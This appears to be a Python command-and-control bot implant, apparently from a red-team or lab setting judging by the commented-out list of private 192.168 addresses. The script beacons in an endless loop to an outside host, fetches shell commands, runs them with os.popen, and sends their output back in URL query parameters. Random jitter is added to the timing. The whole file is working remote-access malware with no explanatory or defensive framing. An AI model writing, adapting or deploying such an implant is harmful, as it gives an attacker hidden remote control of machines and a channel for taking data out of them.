#!/usr/bin/python3
import os, requests, time, socket, json, random, sys, random
'''
ips = [
		'192.168.5.147',
		'192.168.5.152',
		'192.168.5.164',
		'192.168.5.183',
		'192.168.5.196',
		'192.168.5.197',
		'192.168.5.3',
		'192.168.5.31',
		'192.168.5.33',
		'192.168.5.79',
		'192.168.5.94',
		'192.168.6.103',
		'192.168.6.141',
		'192.168.6.151',
		'192.168.6.161',
		'192.168.6.192',
		'192.168.6.193',
		'192.168.6.211',
		'192.168.6.6',
		'192.168.6.82'
]
'''
ips=['ssh.galaxynet.me']

"""
Function: getIP
Parameters: None
Returns: IP of bot
Description: Uses a socket to determine IP of Bot
"""
def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP
	

"""
Function: beacon
Parameters: None
Returns: None
Description: Loops infinately and beacons to c2 server. Recieves commands
			 and sends back command output
"""
def beacon():
	#loop
	while True:
		cmds = {}
		ip = getIP()
		arkIP = random.choice(ips)
		#random offset to vary beacon timing
		offset = random.randrange(-10,10)

		#commands from server to run
		try:
			commands = requests.get('http://{}/beacon?ip={}'.format(arkIP, ip))
		except:
			time.sleep(30 + offset)
			continue
		

		#catch error for bot not being in botlist on server
		if commands.status_code == 500:
			continue
		commands = json.loads(str(commands.content, 'utf-8'))
		#check empty command set
		if commands != '[]':
			for cmd in commands:
				#executes comand
				cmds[cmd] = os.popen(cmd).read()
				#send confirmation of command being run
				try:
					requests.get('http://{}/confirm?ip={}&cmd={}&output={}'.format(arkIP, ip, cmd, cmds[cmd])) 
				except:
					pass
			#print commands
			#print(cmds)
			#TODO send command respone to server
		#wait 3 to 17 seconds to callback
		time.sleep(30 + offset)


beacon()
